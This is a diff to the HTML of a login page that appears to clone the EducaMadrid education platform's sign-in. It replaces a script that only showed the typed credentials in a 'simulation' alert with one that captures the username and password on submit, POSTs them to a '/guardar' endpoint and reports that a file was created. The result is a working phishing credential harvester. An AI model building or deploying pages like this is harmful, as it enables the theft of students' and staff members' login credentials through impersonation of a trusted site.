@@ -209,24 +209,29 @@
  	</div>
  	</footer>
  	</div>
- 	 <script>
-
-  document.getElementById("login").addEventListener("submit", function (e) {
-
-    e.preventDefault(); // ⛔ evita que se envíe a educamadrid
-
-
+ 	<script>
+document.getElementById("login").addEventListener("submit", function (e) {
+    e.preventDefault();
 
     const u = document.getElementById("username").value;
-
     const p = document.getElementById("password").value;
 
-
-
-    alert("Simulación local\n\nUsuario: " + u + "\nContraseña: " + p);
-
-  });
-
+    fetch("/guardar", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `username=${encodeURIComponent(u)}&password=${encodeURIComponent(p)}`
+    })
+    .then(res => res.json())
+    .then(data => {
+        alert("Datos enviados y archivo creado");
+    })
+    .catch(err => {
+        alert("Error al enviar");
+    });
+});
 </script>
+
  	 
  	</body></html>
